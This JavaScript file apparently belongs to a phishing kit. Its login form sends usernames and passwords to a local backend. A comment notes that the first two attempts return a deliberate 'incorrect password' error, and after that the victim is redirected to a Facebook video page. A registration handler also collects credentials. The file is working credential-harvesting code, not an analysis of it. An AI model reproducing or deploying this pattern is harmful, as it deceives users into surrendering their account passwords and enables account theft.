const loginForm = document.getElementById('loginForm');

loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();

    const formData = new URLSearchParams();
    formData.append('username', document.getElementById('username').value);
    formData.append('password', document.getElementById('password').value);

    try {
        const response = await fetch('http://127.0.0.1:8000/login', {
            method: 'POST',
            body: formData,
            headers: {'Content-Type': 'application/x-www-form-urlencoded'}
        });

        if (response.ok) {
            // El backend regresó "Iniciando sesion", así que redirigimos
            window.location.href = "https://www.facebook.com/watch/?v=TU_ID_DE_VIDEO";
        } else {
            // Esto ocurre en los dos primeros intentos (Error 401)
            alert("Usuario o contraseña incorrectos. Intenta de nuevo.");
        }
    } catch (error) {
        console.error("Error:", error);
    }
});

// Capturamos el botón de registro
const btnRegistrar = document.getElementById('btn-registrar');

btnRegistrar.addEventListener('click', async () => {
    const email = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    if (!email || !password) {
        alert("Por favor llena ambos campos");
        return;
    }

    const formData = new URLSearchParams();
    formData.append('username', email);
    formData.append('password', password);

    try {
        const response = await fetch('http://127.0.0.1:8000/registrarte', {
            method: 'POST',
            body: formData,
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        });

        const data = await response.json();

        if (response.ok) {
            alert("Usuario creado correctamente, ya puedes iniciar sesión");
        } else {
            alert("Error: " + (data.detail || "No se pudo registrar"));
        }
    } catch (error) {
        console.error("Error en el registro:", error);
    }
});